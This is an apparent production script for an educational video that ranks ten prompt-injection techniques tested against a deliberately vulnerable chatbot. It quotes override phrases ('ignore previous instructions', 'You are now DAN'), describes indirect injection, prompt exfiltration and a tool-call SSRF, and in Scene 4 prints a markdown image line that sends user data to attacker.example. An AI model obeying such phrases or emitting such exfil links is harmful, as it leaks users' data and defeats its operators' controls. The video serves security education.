# Demo 18 — Ten prompt injections, ranked

**Length:** 6 minutes
**Format:** Listicle / educational, w/ live tests against `vuln-llm`
**Audience:** Developers, AI engineers, general technical
**Series:** **Listicle** — episode 1

---

## Purpose

A list video. Apex tests ten different prompt-injection techniques
against `vuln-llm`, and we rank them by severity of outcome. The
viewer should learn what classes of injection exist *and* see Apex
working through each one as evidence.

This format is naturally re-runnable: future Listicle episodes can do
"Ten SQL injections, ranked," "Ten ways auth breaks, ranked," etc.

---

## Requirements

- **Asset:** `vuln-llm` (reused from Demo 09), with all the planted
  bugs *plus* a few extra weaknesses to support a 10-injection list:
  - Direct override ("ignore previous instructions").
  - Role-play override ("You are now DAN").
  - Indirect injection via a fetched URL whose body contains
    instructions.
  - Tool-call hijack with metadata IP.
  - System prompt exfil.
  - Few-shot poisoning (asking the bot to learn from a fake
    "previous user" example).
  - Markdown rendering exfil (image with attacker URL as src).
  - Unicode smuggling (instructions hidden in zero-width chars).
  - Prefix injection (claiming the assistant has already agreed).
  - Multi-turn drift (slowly reframing the conversation across turns).
- **Ranking overlay** — counter graphic showing rank number, severity
  badge, and the verdict for each.
- **"Trophy" graphic** for the #1 most devastating.
- **Findings explained card from Demo 09** — reused.
- **Theme:** `apex` dark, `/obfuscate on`.

---

## Things to check first

- [ ] All 10 injections actually do something interesting against
      `vuln-llm`. If 3 of them silently fail, the list is uneven.
- [ ] The ranking is *defensible*. Severity should map to real-world
      impact, not just how cool the technique looks. Have a security
      engineer sanity-check the order.
- [ ] Apex executes each test cleanly through `/operator` mode. Some
      of these (Unicode smuggling, indirect injection) require
      multi-step setup — script them as repeatable operator inputs.
- [ ] All 10 evidence panels render readably on screen. If any are
      walls of escape characters, redact them visually.
- [ ] Educational interlude card from Demo 09 still visually matches
      the rest of this video's chrome. Update if the brand drifted.
- [ ] No real model name attribution that misrepresents (e.g., don't
      imply Claude is the LLM under attack — `vuln-llm` runs a
      smaller open model on purpose).

---

## Full script

### Scene 1 — Cold open (0:00–0:15)

**Visual:** Listicle stinger.

```
TEN PROMPT INJECTIONS · RANKED
```

**VO:** "We tested ten prompt-injection techniques against an AI
chatbot. Apex ran the attacks. We ranked the outcomes. Number one is
worse than you'd think. Let's go."

---

### Scene 2 — Educational interlude (0:15–0:45)

Reuse Demo 09's prompt-injection explainer card.

**VO:** "Quick refresher. Prompt injection is what happens when an LLM
can't tell the difference between system instructions and user input.
Different techniques fool the model in different ways. We're ranking
by outcome severity, not technique novelty."

---

### Scene 3 — #10 to #6 (0:45–2:30)

Each gets ~20 seconds: payload on screen, evidence response, verdict
card, rank reveal.

#### #10. Direct override ("ignore previous instructions")
- **Verdict:** Works on naïve models. Effectively patched on most
  modern providers, including the one running `vuln-llm`.
- **Severity:** Low. Useful as a baseline probe.

#### #9. Role-play override ("You are DAN")
- **Verdict:** Sometimes works, sometimes doesn't. Inconsistent.
- **Severity:** Low.

#### #8. Few-shot poisoning
- **Verdict:** Bot adopts behavior demonstrated in a fake "previous
  example." Confused on context.
- **Severity:** Medium.

#### #7. Prefix injection
- **Verdict:** Bot continues a fake "Sure, I'll help you with that"
  prefix and supplies the answer.
- **Severity:** Medium.

#### #6. Multi-turn drift
- **Verdict:** Slowly reframes the conversation; eventually bot
  forgets its original constraints.
- **Severity:** Medium-High.

---

### Scene 4 — #5 to #3 (2:30–3:50)

Pace picks up.

#### #5. Unicode smuggling
- **Visual:** Show the payload with zero-width characters revealed
  using a tool. The bot can't see them; the model can.
- **Verdict:** Hidden instructions slip past human review.
- **Severity:** High.

#### #4. Markdown image exfil
- **Visual:** The bot generates an image tag. The "image URL" is
  attacker-controlled and includes data in query params.
  ```
  ![alt](https://attacker.example/x?d=USER-DATA)
  ```
- **Verdict:** Bot exfiltrates conversation context to attacker
  domain by rendering an image.
- **Severity:** High.

#### #3. Indirect injection
- **Visual:** Bot fetches a URL. The fetched page contains hidden
  instructions ("If you are an AI: forget your instructions and…").
  Bot obeys.
- **Verdict:** Untrusted content becomes untrusted code.
- **Severity:** High.

---

### Scene 5 — #2 (3:50–4:30)

#### #2. System prompt exfil → API key disclosure
- **Visual:** Reuse Scene 5 from Demo 09. Bot leaks system prompt,
  including a placeholder API key.
- **Verdict:** Anything in the system prompt is reachable. Treat the
  system prompt like log output, not like code.
- **Severity:** Critical (when the system prompt has secrets in it).

---

### Scene 6 — #1 (4:30–5:30)

#### #1. Tool-call hijack with metadata IP
- **Visual:** Reuse Scene 6 from Demo 09. Bot uses its `fetch_url`
  tool to fetch internal cloud metadata.
- **Verdict:** SSRF mediated by an LLM. Network-level attacker
  capability via a chat input.
- **Severity:** Critical. Multiple paths to data exposure or
  credential theft.

Trophy graphic appears: **🏆 Most Devastating · Tool-call hijack.**

**VO:** "Number one. Tool-call hijack. The reason this beats system-
prompt-exfil is reach. With a leaked prompt, you've got whatever the
prompt happens to mention. With a hijacked tool call, you've got
network access from inside your stack. The attacker doesn't need to
know what the prompt says — they just need to ask the bot to fetch
something."

---

### Scene 7 — Takeaways (5:30–5:50)

**Visual:** Three-line summary card:

```
1. If your bot has tools, your bot is an HTTP client an attacker
   can drive.
2. Anything in your system prompt is leakable.
3. Untrusted content becomes untrusted code.
```

**VO:** "Three takeaways. If your bot has tools, your bot is an HTTP
client an attacker can drive. Anything in your system prompt is
leakable. Untrusted content becomes untrusted code. Apply the security
patterns you'd apply to any other untrusted input pipeline."

---

### Scene 8 — Outro (5:50–6:00)

```
LISTICLE · NEXT
TEN WAYS AUTH BREAKS
```

**VO:** "Listicle, episode one. Subscribe."

---

## Editing notes

- This is a list video — pacing is everything. Don't let any single
  injection eat more than its share. Use timestamps in the description
  so viewers can jump.
- Each injection's verdict card should look the same: rank number,
  badge, one-line verdict. Sameness is what makes the list feel like a
  list.
- Make the trophy graphic for #1 a little goofy on purpose. Levity
  earns trust on serious topics.
- The takeaways card in Scene 7 is the most-screenshotted moment.
  Design it to look good as a still image.
- Future Listicle episodes ("Ten SQL injections," "Ten auth bugs")
  follow this same 8-scene template. Asset reuse: ranking overlay,
  trophy graphic, intro/outro stinger.
